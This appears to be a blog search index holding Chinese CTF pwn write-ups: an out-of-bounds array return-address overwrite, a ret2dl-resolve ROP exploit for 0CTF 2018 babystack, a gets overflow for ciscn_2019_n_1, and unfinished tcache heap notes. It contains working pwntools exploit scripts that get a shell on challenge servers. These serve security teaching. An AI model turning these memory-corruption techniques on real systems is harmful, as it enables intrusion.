<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>name_your_cat</title>
    <url>/2021/09/24/2021_9_20_name_your_cat/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>每日一题的第三题，主要是对于上一道题的一个巩固和补充，涉及到了一点函数执行流的控制，但是总体还是比较简单。</p>
<h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>在上一道题目里我们遇见了一个溢出数组变量的内存空间的漏洞，一般来说我们称这种类型漏洞为数组越界漏洞（当然，漏洞的俗名只是方便大家归类整理与交流，自己的另起说法也是可行的）。<br>但是稍微回想一下，上一道题的关键是通过数组越界修改v2变量的值，程序设定好了，只要v2被更改为这个值，我们就能获得flag。<br>然而在上上道，也就是nc中，我们提到过，想要做出pwn题，需要想方设法使程序执行<code>system（‘’/bin/sh&quot;</code>）。而那一道数据越界的题目根本没有提到<code>system(‘’/bin/sh&quot;)</code>，这又是怎么回事呢？难道自相矛盾了吗？<br>实际并不是，大家如果研究一下system函数，就会知道，其实上一道题，我们之所以能拿到flag，也是因为程序执行了一个和<code>system（&quot;/bin/sh&quot;)</code>有一点像的<code>system(cat flag)</code>。<br>为什么这两个函数参数不同，但执行的最终效果是等同的，以及这个函数的背后原理如何，可以参考文章：<br>这些其实都是为了引出我们这一道题的解法–通过数组溢出控制程序执行流，从而调用<code>system()</code>函数。<br><img src="https://img-blog.csdnimg.cn/cf69a123941f4c97a2a5403c42a853e9.png" alt="请添加图片描述"></p>
<p>用ida打开这道题，我们能够发现main函数一共只调用了两个函数，一个是<code>init（）</code>，这个函数进行一系列初始化的操作，暂时可以忽略，然后就是一个看起来比较关键的函数<code>vulnerable()</code>,这个单词的意思是，易受攻击的。出题者将这个函数命名为易受攻击的函数，肯定是要给我们一些提示，解题的关键大体也在这个函数中。<br><img src="https://img-blog.csdnimg.cn/836bbf48dd4647a3a3243fa90a015183.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmluNzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>双击进入<code>vulnerable()</code>函数内部。观察一下函数的代码逻辑。</p>
<p>（这个lemon应该是个符号。酸的意思）<br>为了让大家更能清楚地看懂程序的执行逻辑，我把每一行大致的功能或者意思讲清楚。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">vulnerable</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// ST20_4</span><br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+Ch] [ebp-3Ch]</span><br>  <span class="hljs-keyword">char</span> v3[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [esp+14h] [ebp-34h]，定义了一个大小为0x30的字符类型数组储存猫猫的名字。</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [esp+3Ch] [ebp-Ch]</span><br><br>  v4 = __readgsdword(<span class="hljs-number">0x14</span>u); <span class="hljs-comment">//这个 __readgsdword(0x14u)是一个对于溢出的检查，大家可以简单地将它理解为read函数。</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I bought you five famale cats.Name for them?&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">5</span>; ++i )<br>  &#123;<br>    v0 = NameWhich((<span class="hljs-keyword">int</span>)v3);<span class="hljs-comment">//嵌套调用的另外一个函数，用来给猫猫命名。</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You get %d cat!!!!!!\nlemonlemonlemonlemonlemonlemonlemon5555555\n&quot;</span>, i);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Her name is:%s\n\n&quot;</span>, &amp;v3[<span class="hljs-number">8</span> * v0]);<span class="hljs-comment">//取出v中存的指定的字符串，看不懂的可以看看下面namewhich中的解释。</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v4;<span class="hljs-comment">//与那个溢出检查相对应，可以忽略。</span><br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>然后是namewhich函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">NameWhich</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<span class="hljs-comment">//同理</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Name for which?\n&gt;&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v2);<span class="hljs-comment">//询问要给哪只猫命名，然后你的选择被储存在v2中，也就是v2现在是一个数字。</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Give your name plz: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%7s&quot;</span>, <span class="hljs-number">8</span> * v2 + a1);<span class="hljs-comment">//，%7s代表我们最多只能用七个字符给猫猫命名，然后这里的a1就是vulnerable()中的namewhich的函数参数，也就是v3这个数组。8 * v2 + a1，大致理解就是把v3这个40大小的内存块分为五个格子，每个格子大小为8，然后通过8*格子的序列号来定位。+a1是为了找到v3内存卡的位置。</span><br>  <span class="hljs-keyword">return</span> v2;<span class="hljs-comment">//返回v2，也就是给第v2只猫猫命名的那个v2.</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>大体分析完函数的代码逻辑，就来到了我们解题的第一个关键：漏洞点的分析。<br>题目说到，买了五只小猫猫，然后请你给它们命名。for循环也规定了i最大为5，但是在NAmeWhich中，选择给第几只猫命名时的数字却没有限定。这就造成了数组溢出。<br>我们在vulnreable函数中找到储存猫猫名字的数组的那个变量，也就是v3<img src="https://img-blog.csdnimg.cn/5919e942926045cab0e6f629afede46e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmluNzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>双击v3，进入ida中的stack窗口。<img src="https://img-blog.csdnimg.cn/63b65e308abe4c3f8e0d16b8b0123919.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmluNzc3,size_19,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>这里的var_34就是v3数组开始的地址。<br>然后重点关注一下+00000004位置的r。<br>这个r看起来非常不起眼，但是确是我们解题的关键。<br>从这里开始我们就要引入一个新的概念–函数的返回地址了。<br>众所周知我们程序功能是由一个个函数实现的，一般来说程序需要有main函数，然后main函数内部再调用不同的函数。比如在这道题目中main函数调用了vulnreable函数，那么当vulnreable函数执行完成，计算机应该跳回main函数继续执行，但是计算机并不知道执行完vulnreable函数之后应该去哪里继续执行，所以这时后我们需要一个返回地址，来告诉计算机应该跳到哪里继续执行程序。<br>关于函数返回地址实际上还有很多知识需要大家理解，但是要做出题的话，只需要知道“返回”就像一个传送门，你可以利用它跳转到几乎任意你想要跳转的地方。<br>实际上想要彻底理解这里的秘密，需要大家学习函数调用栈，以及一些基础的汇编语言知识，这些我们留到下一周再讲，现在以感受题目为主。<br>既然我们能够跳转到任意地址，我们是不是能把返回地址改成<code>system（&quot;/bin/sh&quot;）</code>的地址，让函数返回时实则是在调用<code>system（&quot;/bin/sh&quot;）</code>呢？<br><img src="https://img-blog.csdnimg.cn/a375862e2f114716becf32cc5f76fb29.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmluNzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>在ida中，我们能够很轻易地发现，程序是包含这个后门函数的，这意味着我们可以直接引用这个函数在ida中的地址来调用它（具体的原理可以以后再学）。地址则是0x80485CB。<br><img src="https://img-blog.csdnimg.cn/07e6fabdb91e4f01af58d6b0a84879bd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmluNzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>。<br>那么就只剩下最后一个问题了：我们怎样才能把返回地址覆盖成0x80485CB呢？<br>还是回到stack窗口。<br><img src="https://img-blog.csdnimg.cn/63b65e308abe4c3f8e0d16b8b0123919.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmluNzc3,size_19,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述">现在再看一看，返回地址就在+04这里，而我们给猫猫命名，字符串是从-0x34开始存的，还记得之前分析到的，每一只猫猫名字最多是七个字符，并且内存空间是以8为单位划分的，从-0x34到=+04，一共有0x38，也就是56个字符。56%8 = 7<img src="https://img-blog.csdnimg.cn/8bc5c6eafc254ac5b20cf8aa4574c4aa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmluNzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>从第48个字符开始，其实就已经是ret的地址了。也就是说第七只猫猫的名字，正好存在返回地址所在的地址上。<br>所以是不是只要我们给第七只猫命的名，是我们刚刚找到的后门函数的地址，就能够提权，获得flag了？</p>
<h3 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h3><p>怀着这样的决心，我们开始编写这道题的脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,xxxxx)<br><br>shell_addr=<span class="hljs-number">0x80485CB</span><br><br>p.sendlineafter(<span class="hljs-string">&#x27;Name for which?\n&gt;&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Give your name plz: &quot;</span>,p32(shell_addr))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
<p>脚本的内容应该是很容易理解的，但是这里出现了一个问题。<br>按照逻辑，我们只需给第七只猫命名为后门函数的地址，但是实际执行的时候并没有如我们所想的那样顺利。<img src="https://img-blog.csdnimg.cn/e543f9ea4e384bb9806a9d120e85ce08.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmluNzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>ps:如果出现了<code>timeout: [*] Got EOF while reading in interactive </code>就说明交互超时，然后程序会自动退出，大概率说明你的exp存在问题（但也有很多题目是本身就存在时限）<br><img src="https://img-blog.csdnimg.cn/b1099c2b08b049cabc108cb75f2af2ca.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmluNzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>给前面几只猫猫也命上就可以了。<br>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29553</span>)<br><br><br>shell_addr=<span class="hljs-number">0x80485CB</span><br><br>p.sendlineafter(<span class="hljs-string">&#x27;Name for which?\n&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Give your name plz: &quot;</span>,<span class="hljs-string">&#x27;nya&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Name for which?\n&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Give your name plz: &quot;</span>,<span class="hljs-string">&#x27;B&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Name for which?\n&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Give your name plz: &quot;</span>,<span class="hljs-string">&#x27;C&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Name for which?\n&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Give your name plz: &quot;</span>,<span class="hljs-string">&#x27;D&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Name for which?\n&gt;&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Give your name plz: &quot;</span>,p32(shell_addr))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>daliy_challanges</tag>
      </tags>
  </entry>
  <entry>
    <title>0CTF_2018_babystack</title>
    <url>/2021/08/02/0CTF2018-babystack/</url>
    <content><![CDATA[<h2 id="1-review"><a href="#1-review" class="headerlink" title="1)review"></a>1)review</h2><p>作为ret2dl的复习题。</p>
<h2 id="2）exploitation"><a href="#2）exploitation" class="headerlink" title="2）exploitation"></a>2）exploitation</h2><p>溢出0x28+0x4字节，但是由于rop空间太小需要栈迁移。</p>
<p>并且没有aslr，relro为partial。</p>
<p>非常典型的ret2dl。</p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>可以直接用roputils做</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> roputils<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>offset = <span class="hljs-number">44</span><br>readplt = <span class="hljs-number">0x08048300</span><br>bss = <span class="hljs-number">0x0804a020</span><br>vulFunc = <span class="hljs-number">0x0804843B</span><br><br>p = process(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getReloc</span>(<span class="hljs-params">elf, base</span>):</span><br>    jmprel = elf.dynamic(<span class="hljs-string">&#x27;JMPREL&#x27;</span>)<br>    relent = elf.dynamic(<span class="hljs-string">&#x27;RELENT&#x27;</span>)<br><br>    addr_reloc, padlen_reloc = elf.align(base, jmprel, relent)<br>    reloc_offset = addr_reloc - jmprel<br>    <span class="hljs-keyword">return</span> reloc_offset<br><br>rop = roputils.ROP(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>addr_bss = rop.section(<span class="hljs-string">&#x27;.bss&#x27;</span>)<br><br><span class="hljs-comment"># step1 : write sh &amp; resolve struct to bss</span><br>buf1 = <span class="hljs-string">b&#x27;A&#x27;</span> * offset <span class="hljs-comment">#44</span><br>buf1 += p32(readplt) + p32(vulFunc) + p32(<span class="hljs-number">0</span>) + p32(addr_bss) + p32(<span class="hljs-number">100</span>)<br>p.send(buf1)<br><br>buf2 =  rop.string(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>buf2 += rop.fill(<span class="hljs-number">20</span>, buf2)<br>buf2 += rop.dl_resolve_data(addr_bss+<span class="hljs-number">20</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>buf2 += rop.fill(<span class="hljs-number">100</span>, buf2)<br>p.send(buf2)<br><br><span class="hljs-comment">#step2 : use dl_resolve_call get system &amp; system(&#x27;/bin/sh&#x27;)</span><br>buf3 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">44</span> + rop.dl_resolve_call(addr_bss+<span class="hljs-number">20</span>, addr_bss)<br>p.send(buf3)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_n_1</title>
    <url>/2021/09/15/2021_09_15_ciscn_2019_n_1/</url>
    <content><![CDATA[<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>  每日一题pwn方向的第二题。也是初入漏洞利用的一道特别基础的题。<br>  大家都应该尝试着做过了上一道，也就是test your nc。从解法来说其实那道题的难度真的只是半脚踩在入门的门坎上。就像wp中所说的那样，目前pwn题的核心是通过漏洞挖掘与利用来提权，而nc这道题可以说是不需要任何漏洞的挖掘与利用，做出这道题并不代表你已经入门pwn了。<br>  虽然如此，从ciscn_2019_n_1这道题开始，我们真正要开始尝试迈过pwn题的那一道门槛，面对一些简单的漏洞进行利用了。</p>
<h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>  在做题之前，建议每一个同学在ubunut中安装pwntools。<br>  python环境完备的基本一个<code>pip3 install pwntools</code>就行。如果报错的话再去搜索一下具体问题。  </p>
<h4 id="做题流程"><a href="#做题流程" class="headerlink" title="做题流程"></a>做题流程</h4><p>这里要提一个大致的流程。对于执行顺序其实并没有那么多硬性规定，只是对于萌新也许能少走一些弯路。<br>流程大致是这样的：</p>
<ol>
<li>拿到题目附件，将它在对应的操作系统环境下打开（一般来说是ubuntu）。先执行一下，了解一下程序的大致运行结果。</li>
<li>checksec命令，了解程序的保护方式。针对不同的保护方式，大致了解题目的难度等级。（萌萌新的题目应该大多是没有任何保护的，但是之后的很多题都会附加很多复杂的保护）</li>
<li>用ida打开题目，对题目进行一个程序逻辑的逆向。</li>
<li>通过逆向找到程序的漏洞点。</li>
<li>思考漏洞利用方式，并开始编写脚本（适当时动态调试辅助脚本编写）。</li>
<li>脚本编写完成后，先在本地尝试getshell。成功的话连接远程拿flag。</li>
</ol>
<p> 整个流程最关键也是最难的就是第6步。在这个wp中，我会尽可能地详细地将编写这个脚本的所有步骤和思路讲出来。其他的步骤也会进行适当的解释。</p>
<h4 id="运行题目程序"><a href="#运行题目程序" class="headerlink" title="运行题目程序"></a>运行题目程序</h4><p>这也是流程中的第一步，总的来说这一步并不是必要的，但是运行一下总归能帮助大家提升对于程序逻辑的理解（尤其是逆向以及语言功底比较弱的同学）<br>现在我们将程序放进了ubuntu系统中，<img src="https://img-blog.csdnimg.cn/695984469e1b4e0a85148e6ec1ac050c.png" alt="请添加图片描述"></p>
<p>  可以看到这个文件夹下的ciscn_2019_n_1文件。<br>  这时我们会碰到今天的第一个坑。<br>  如果我们直接<code>./ciscn_2019_n_1</code>,<img src="https://img-blog.csdnimg.cn/d7acde5f1fb1406aa0f6dadbd787384f.png" alt="请添加图片描述"><br>  就会出现如图的情况。<br>  这是因为这个文件虽然可执行，但是我们并没有可执行权限。<br>  这个情况直接利用<code>chmod +x ciscn_2019_n_1</code>来将文件权限改成可执行就行。<br>  具体的原理可以搜索一下<code>chmod</code>指令。<br>  <img src="https://img-blog.csdnimg.cn/698613b67628460495656d7123421a12.png" alt="请添加图片描述"><br>通过<code>ls -l</code>指令目，可以看到ciscn_2019_n_1文件的权限是rwx，意味着它已经能够被执行。这时候再<code>./ciscn_2019_n_1</code>，程序就成功被执行了。<br>执行的话可以看到程序要求我们猜数。<br>（我这个颜色有点诡异，这就调一下）<br><img src="https://img-blog.csdnimg.cn/9ecef25aee574c13af3eaac0b1d1b2b4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmluNzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
<p>可以看到连续两次程序都说，我们输入的值要为11.28125，但是我们输入了这个11.28125，程序还是没有什么让人提得起兴趣的反映。这很奇怪，待会儿让我们在ida中一探究竟（）。</p>
<h4 id="checksec查保护"><a href="#checksec查保护" class="headerlink" title="checksec查保护"></a>checksec查保护</h4><p>比较简单，如果需要安装就按提示安装或者搜索安装方式就行。<br><img src="https://img-blog.csdnimg.cn/ec862f6c146a4cce9f3610ace8ddb858.png" alt="请添加图片描述"></p>
<h4 id="程序逻辑分析"><a href="#程序逻辑分析" class="headerlink" title="程序逻辑分析"></a>程序逻辑分析</h4><p>用ida64打开。<br>f5反编译<br><img src="https://img-blog.csdnimg.cn/6da88d9c4e6644e3928813a23e50ce3e.png" alt="在这里插入图片描述"><br>出现了这样一串代码。<br>稍微分析一下，双击func（）进入函数内<br>我们<img src="https://img-blog.csdnimg.cn/20210915193523917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/83b3286661a548d8b0cd254894cae432.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmluNzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这个程序的代码逻辑非常简单。<br>定义了两个变量，一个是整形的v1，另外一个是浮点型v2。<br>这里需要了解的一个知识点就是，当我们定义变量，计算机会为我们在内存中开辟一块内存空间来存储我们的变量的值。而且这个空间是连续的，开辟了v1以后再开辟v2，他们的内存块是接在一起的。<br>如图所示。<img src="https://img-blog.csdnimg.cn/20210915191626757.png" alt="在这里插入图片描述"></p>
<p>输入数字，把数字存在v1这个内存快中，然后判断v2内存块是不是11.28125，如果是，就能拿到flag，不是就输出”Its value should be 11.28125”<br>想要拿flag，需要使v2为11.28125.但是我们输入的变量是存在v1，似乎并没有任何方式能够改变v2的值。<br>回想一下，刚刚我们说到v1和v2的内存空间是连续的。在ida中我们其实能够发现v1内存块的大小是0x30，那么想一想，如果我们在给v1赋值的时候，输入了比0x30还大的字符串，会发生什么呢。<br>当字符串填满了v1的0x30的空间，由于gets函数并不会检查内控空间中发生的溢出，多出来的字符串会继续向下存入，也就是相当于越过v1内存块的界限，存进ｖ2内存块中了。<br>这样只要我们巧妙地构造我们输入的字符串，先用0x30个任意字符将ｖ1填满，再在后面加上11.28125，是不是v2的值就变成了我们想要的？</p>
<h4 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h4><p>我们直接略过漏洞点的寻找，开始编写脚本。<br>我们的目标很明确，当程序要我们输入number的时候，我们给它发一大串字符串，其中前0x30个字符是任意的垃圾字符，之后是11.28125的16进制表示。<br>这里有一个坑。就是如何正确地找到11.28125在计算机内存中的表示。</p>
<p>完整的脚本如下，具体每一句都会有详细的解释。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#导入pwntools模块，python基础知识，没有pwntools的同学可以自行搜索安装方式。</span><br><span class="hljs-comment">#p = process(&#x27;./ciscn_n_1&#x27;)#以本地运行的方式加载程序，一般来说先是本地测试脚本，能打通再远端连接。</span><br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27494</span>)<span class="hljs-comment">#以远程连接的方式加载程序。span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x2c</span><span class="hljs-comment">#这两行放在外面重点讲</span><br>payload += p64(<span class="hljs-number">0x41348000</span>)<span class="hljs-comment">#11.28125在内存中的十六进制表示</span><br><br>p.send(payload)<span class="hljs-comment">#将payload发送</span><br><br>p.interactive()<span class="hljs-comment">#与远端程序交互</span><br></code></pre></td></tr></table></figure>
<p>然后着重讲一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x2c</span><br>payload += p64(<span class="hljs-number">0x41348000</span>)<br></code></pre></td></tr></table></figure>
<p>这两句。就是构造字符串的过程，payload就是0x2c个a加上0x4134800的机器码。配合上后面的<code>p.send(payload)</code>，将payload发送给程序。<br>首先需要对payload这个东西有一个大致的理解。<br>在这之前有一个问题必须要理解。<br>之前说到我们需要输入一大串字符串传入程序，一般的思维方式就是执行程序，然后在该输入的时候把要输入的东西输进去就行。看起来比较直观也比较简单，所以为什么要花力气用编程语言写脚本来执行这些呢？<br>ttz您来写。我写不下去了。就大概讲一下为什么要用脚本以及如何正确理解payload。</p>
<p>然后回归正题，关于字符串的构造。<br>第一句很简单，就是垃圾字符的填充。<br>但是具体要填充多少，每道题可能都不太一样，可以通过ida查看。<br>然后是下面那个11.28125在内存中的表示。<br>关于如何找到11.28125的内存表示，第一种方式是直接在ida中查看，第二种方式是直接进制转化的方式，但是这个方法存在大小端序的问题，直接转化的话是大端序表示，而内存中应当是小端序，萌萌新可能会被这个点坑很久（）<br>ida查看的话直接找到伪代码对应汇编的比较ｖ2与11.28125的那一段，找到表示11.28125的字符串，点进去（回去补图）<br>这样我们就找了<code>0x41348000</code><br>然后我们将它填进去。<br>可能会有同学疑惑为什么这里不是直接<code>payload = 0x41348000</code><br>或者<code>payload = b’0x41348000’</code></p>
<p>Payload不是直接payload = b’0x41348000’是怎么回事呢？Payload相信大家都很熟悉，但是Payload不是直接payload = b’0x41348000’是怎么回事呢，下面就让小编带大家一起了解吧。</p>
<p>Payload不是直接payload = b’0x41348000’，其实就是我们需要输入的不是字符串，大家可能会很惊讶Payload怎么会不是直接payload = b’0x41348000’呢？但事实就是这样，小编也感到非常惊讶。</p>
<p>这就是关于Payload不是直接payload = b’0x41348000’的事情了，大家有什么想法呢，欢迎在评论区告诉小编一起讨论哦！<br>（）<br>P64(0x41348000)指将整数进行64位格式的打包，其实就是把一串人能读懂的数字转换成机器码，大概长这样 <code>‘/x00/x80/x34/x41’</code><br>然后我们用这个脚本演示一下吧。<br><img src="https://img-blog.csdnimg.cn/20210915204609232.jpeg" alt="在这里插入图片描述"></p>
]]></content>
      <tags>
        <tag>daliy_challanges</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcache利用</title>
    <url>/2021/08/13/Heap-Tcache%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h3 id="Tcache-利用"><a href="#Tcache-利用" class="headerlink" title="Tcache 利用"></a>Tcache 利用</h3><p>不是学习不是学习不是学习，</p>
<p>例题是lctf2018的easyheap。</p>
<h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>一个又明显又不明显的漏洞、来自于输入后会把chunk_ptr置为0。</p>
<p>然后联想到malloc的内存分配机制，如果我们malloc一个16*n+8型的chunk，由于ptmalloc的内存复用机制，我们可以利用这个置零的漏洞使得物理相邻的下一个chunk的prevsize位包括previnuse位为0。然后构造堆叠。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 __fastcall <span class="hljs-title">sub_BEC</span><span class="hljs-params">(_BYTE *a1, <span class="hljs-keyword">int</span> a2)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( a2 )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      read(<span class="hljs-number">0</span>, &amp;a1[v3], <span class="hljs-number">1uLL</span>);<br>      <span class="hljs-keyword">if</span> ( a2 - <span class="hljs-number">1</span> &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v3 || !a1[v3] || a1[v3] == <span class="hljs-number">10</span> )<br>        <span class="hljs-keyword">break</span>;<br>      ++v3;<br>    &#125;<br>    a1[v3] = <span class="hljs-number">0</span>;<br>    a1[a2] = <span class="hljs-number">0</span>;<span class="hljs-comment">//loophole</span><br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *a1 = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>然后又注意到我们最多只能分配十个堆块，除去需要填满Tcache的七个堆块，也就是我们只能分配十个相同大小的堆块。</p>
<p>在完成这道题之前我们需要先理解unsortedbin 泄漏libc的原理。</p>
<p>包括ciscn lonelywolf也是利用到了这一点。</p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcahce学习</title>
    <url>/2021/08/17/Heap%E2%80%94%E2%80%94Tcache%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="Tcahce学习"><a href="#Tcahce学习" class="headerlink" title="Tcahce学习"></a>Tcahce学习</h1><h2 id="0）review"><a href="#0）review" class="headerlink" title="0）review"></a>0）review</h2><p>说是Tcache学习，实际上是lonelywolf的复现。</p>
